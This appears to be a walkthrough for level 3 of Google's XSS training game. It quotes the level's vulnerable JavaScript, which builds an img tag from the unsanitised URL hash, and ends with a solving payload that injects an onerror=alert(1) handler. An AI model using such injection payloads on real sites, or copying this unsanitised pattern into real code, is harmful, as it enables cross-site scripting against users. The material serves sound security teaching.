---
title: Level 3 - That sinking feeling...
edit_url: null
---

![1](https://github.com/user-attachments/assets/90bc719e-e4ad-4584-bb07-1e6d9be989df)

## Hints

> 1. To locate the cause of the bug, review the JavaScript to see where it handles user-supplied input.

> 2. Data in the `window.location` object can be influenced by an attacker.

> 3. When you've identified the injection point, think about what you need to do to sneak in a new HTML element.

> 4. As before, using `<script> ...` as a payload won't work because the browser won't execute scripts added after the page has loaded.

## Script

```html {17,20} showLineNumbers title="index.html"
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
 
    <!-- Load jQuery -->
    <script
      src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js">
    </script>
 
    <script>
      function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
 
        window.location.hash = num;
 
        // Select the current tab
        var tabs = document.querySelectorAll('.tab');
        for (var i = 0; i < tabs.length; i++) {
          if (tabs[i].id == "tab" + parseInt(num)) {
            tabs[i].className = "tab active";
            } else {
            tabs[i].className = "tab";
          }
        }
 
        // Tell parent we've changed the tab
        top.postMessage(self.location.toString(), "*");
      }
 
      window.onload = function() { 
        chooseTab(unescape(self.location.hash.substr(1)) || "1");
      }
 
      // Extra code so that we can communicate with the parent page
      window.addEventListener("message", function(event){
        if (event.source == parent) {
          chooseTab(unescape(self.location.hash.substr(1)));
        }
      }, false);
    </script>
 
  </head>
  <body id="level3">
    <div id="header">
      <img id="logo" src="/static/logos/level3.png">
      <span>Take a tour of our cloud data center.</a>
    </div>
 
    <div class="tab" id="tab1" onclick="chooseTab('1')">Image 1</div>
    <div class="tab" id="tab2" onclick="chooseTab('2')">Image 2</div>
    <div class="tab" id="tab3" onclick="chooseTab('3')">Image 3</div>
 
    <div id="tabContent"> </div>
  </body>
</html>
```

In the source code we can see that the `num` variable is populated with the value of `window.location.hash`.

```
e.g.
URL: https://xss-game.appspot.com/level3/frame#1
num = 1
```

The value of `num` is then inserted into the source address of the image.

```
e.g.
num = 1
html += "<img src='/static/level3/cloud1.jpg' />";
```

## Payload

Since we can control the value of `window.location.hash`, we can control the source address of the image.

In order to solve this level, we can provide the following URI: 

```
https://xss-game.appspot.com/level3/frame#4' onerror=alert(1) ";
```

This will cause the source code to look as follows:

![2](https://github.com/user-attachments/assets/932a645a-9fe7-466f-8b8c-f620b1e4f704)

![3](https://github.com/user-attachments/assets/23e4f6c1-39bd-4b74-aaa9-7327aa06ebec)
